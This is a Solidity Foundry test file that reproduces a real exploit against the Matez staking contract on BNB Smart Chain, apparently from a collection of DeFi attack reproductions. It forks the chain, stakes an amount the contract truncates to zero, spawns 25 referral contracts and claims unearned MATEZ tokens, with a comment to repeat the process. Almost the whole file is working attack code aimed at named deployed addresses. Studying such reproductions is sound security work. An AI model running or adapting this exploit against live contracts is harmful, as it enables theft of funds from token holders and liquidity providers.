// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 80k USD
// Attacker : https://bscscan.com/address/0xd4f04374385341da7333b82b230cd223143c4d62
// Attack Contract : https://bscscan.com/address/0x0aD02ce1b8EB978FD8dc4abeC5bf92Dfa81Ed705
// Vulnerable Contract : https://bscscan.com/address/0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa
// Attack Tx : https://bscscan.com/tx/0x840b0dc64dbb91e8aba524f67189f639a0bc94ee9256c57d79083bb3fd46ec91

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1859830885966905670
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant MATEZ_STAKING_PROG = 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa;
address constant MATEZ_TOKEN = 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9;

contract Matez is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44222632 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = MATEZ_TOKEN;
    }

    function testExploit() public balanceLog {
        //implement exploit code here

        // due to the integer truncation problem, the following number will be truncated to 0,
        // This flaw allowed the attacker to transfer a zero amount of tokens while 
        // being recognized by the contract as having staked a large amount. 
        uint256 amount = 340282366920938463463374607431768211456;
        IMatez matez = IMatez(MATEZ_STAKING_PROG);

        // register current contract
        address sponsor = 0x80d93e9451A6830e9A531f15CCa42Cb0357D511f;
        matez.register(sponsor);
        matez.stake(amount);

        // create enough referrals to enable claim
        for (uint256 i = 0; i < 25; i++) {
            new AttackContract(address(this), amount);
        }

        // claim free MATEZ token and sell it later
        IMatez(MATEZ_STAKING_PROG).claim(uint40(3), uint40(1), 0);

        // keep repeat this process to get more MATEZ token for free
    }
}

contract AttackContract {
    constructor(address sponsor, uint256 amount) {
        IMatez matez = IMatez(MATEZ_STAKING_PROG);
        matez.register(sponsor);
        matez.stake(amount);
    }
}

interface IMatez {
    function register(address _sponsor) external;
    function stake(uint256 amnt) external;
    function claim(uint40 typ, uint40 pkgid, uint256 amount) external;
}
